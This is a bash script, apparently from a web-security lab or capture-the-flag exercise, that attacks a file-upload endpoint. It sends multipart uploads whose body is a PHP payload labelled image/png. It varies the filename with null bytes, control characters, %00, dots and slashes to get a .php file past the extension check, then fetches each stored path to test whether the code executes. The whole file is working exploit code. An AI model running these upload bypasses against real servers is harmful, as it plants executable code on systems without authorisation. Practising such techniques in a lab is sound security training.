#!/usr/bin/env bash
cd "$(dirname "$0")" || exit 1
clear
H='Host: test-s3.web0x05.hbtn'
B='http://web0x05.hbtn'
URL="$B/api/task2/"
PHP='<?php readfile('"'"'FLAG_2.txt'"'"') ?>'
BND='----sep123'

# $1 = libellé ; $2 = filename (peut contenir des octets echappes via printf %b)
try() {
  local label="$1" fn="$2"
  local body=/tmp/body.bin
  {
    printf -- "--%s\r\n" "$BND"
    printf 'Content-Disposition: form-data; name="file"; filename="'
    printf '%b' "$fn"
    printf '"\r\n'
    printf 'Content-Type: image/png\r\n\r\n'
    printf '%s\r\n' "$PHP"
    printf -- "--%s--\r\n" "$BND"
  } > "$body"

  local resp
  resp=$(curl -s -H "$H" -H "Content-Type: multipart/form-data; boundary=$BND" --data-binary @"$body" "$URL")
  echo "[$label] -> $resp"

  # si succes, extraire le chemin et tester l'execution
  local path
  path=$(echo "$resp" | grep -oE "/static/[^']*" | head -1)
  if [ -n "$path" ]; then
    local out
    out=$(curl -s -H "$H" "$B$path")
    echo "        fetch $path => $out"
  fi
}

try "null -> .php"      'p2.php\x00.png'
try "newline"          'p2.php\x0a.png'
try "CR"               'p2.php\x0d.png'
try "tab"              'p2.php\x09.png'
try "null court"       'p2.php\x00'
try "pct00 litteral"   'p2.php%00.png'
try "double point"     'p2.php..png'
try "slash"            'p2.php/.png'
try "backslash"        'p2.php\\.png'
